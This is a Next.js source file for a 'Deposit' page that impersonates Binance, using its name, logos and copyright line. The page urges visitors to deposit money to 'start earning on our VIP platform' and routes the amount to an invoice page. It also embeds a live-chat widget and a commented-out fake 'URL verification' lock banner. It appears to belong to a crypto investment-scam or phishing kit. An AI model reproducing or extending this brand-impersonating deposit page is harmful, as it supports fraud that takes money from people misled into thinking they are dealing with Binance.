import Head from 'next/head'
import Script from 'next/script'
import { useRouter } from 'next/router'
import { useState, useEffect, useRef } from 'react'
import Link from 'next/link'
import { LockClosedIcon } from "@heroicons/react/solid"
import Loader from '../../components/loader'
import { useDispatch } from 'react-redux'
import { setAmount } from '../../redux/APP_STATE/actions'

export default function Deposit() {
  const router = useRouter()
  const dispatch = useDispatch()
  const formRef = useRef(null)
  const btnRef = useRef(null)

  const handle_deposit_submit = (e) => {
    e.preventDefault()
    btnRef.current.textContent = 'Processing...'

    const form = formRef.current
    const amount = form.amount.value

    dispatch(setAmount(amount))
    router.push('/dashboard/invoice')

  }

  return (
    <div id="wrapper" className='text-sm font-ibm_plex text-gray-800 h-[100vh]'>
        <Loader />
      <Head>
        <title>Deposit | Binance</title>
        <link rel="icon" href="/favicon.ico" />
        <Script src="//code-eu1.jivosite.com/widget/VBkQPci8kv" async></Script>
      </Head>

      {/* LOGIN HEADER */}
      <div id="Header" className='flex justify-between p-5'>
        <div className="logo">
          <img className='h-6' src="/binance-logo.svg" alt="Logo" />
        </div>
        <div className="menu">English |</div>
      </div>
      {/* URL Verification INFO */}
      {/* <div className='w-full flex items-center justify-center p-2.5 text-xs text-gray-700 bg-[#FEF6D8]'>
              <p><span className='font-semibold'><LockClosedIcon className='h-5 mr-1 text-green-500 inline' /> URL verification: </span><span className='text-green-400'>https://</span>{host_url}{ path_name }</p>
      </div> */}

      {/* ====================== LOGIN SECTION ==================== */}
      <div className="max-w-4xl px-5 pt-10 pb-3 md:p-16 mx-auto md:flex justify-between items-end">
        <div className="w-full md:w-[400px] mb-5 md:mb-0">
          <h2 className="text-2xl md:text-3xl font-semibold mt-2 mb-10 md:my-2">Deposit</h2>
          <p className='text-gray-600 text-base pt-2'>To start earning on our VIP <img src="/binance-diamond-logo.svg" alt="" className="inline h-4" /> platform make deposit to your account.</p>
          <form className="my-5" ref={formRef} onSubmit={ handle_deposit_submit }>
            <div className="input_field">
              <label className="block">Enter deposit amount</label>
              <div className="px-3 w-full border rounded-md focus-within:border-[#E18404] flex justify-between items-center">
                <input type="number" name='amount' placeholder='e.g 1000 USD' className='py-3.5 pr-3.5 w-[80%] outline-none appearance-none' required />
                 {/* <span className="inline-block text-primary_dim font-semibold cursor-pointer mr-1">Get code</span>  */}
              </div>
            </div>

            {/* <button className="w-full bg-gradient-to-b from-primary to-[#E49F5E] text-center text-gray-800 font-semibold p-3 rounded-sm">Log In</button> */}
            <button ref={btnRef} className="w-full bg-primary text-center text-gray-800 font-semibold p-3 mt-3 rounded-sm">Deposit</button>
          </form>
          <Link href="#"><span className="text-primary_dim my-2 cursor-pointer">Unable to deposit?</span></Link>
        </div>
      </div>
      <footer>
        <div className="w-full pt-10 text-xs absolute bottom-5 text-gray-500 text-center">&copy; 2017 - { new Date().getFullYear() } Binance.com All rights reserved</div>
      </footer>
    </div>
  )
}
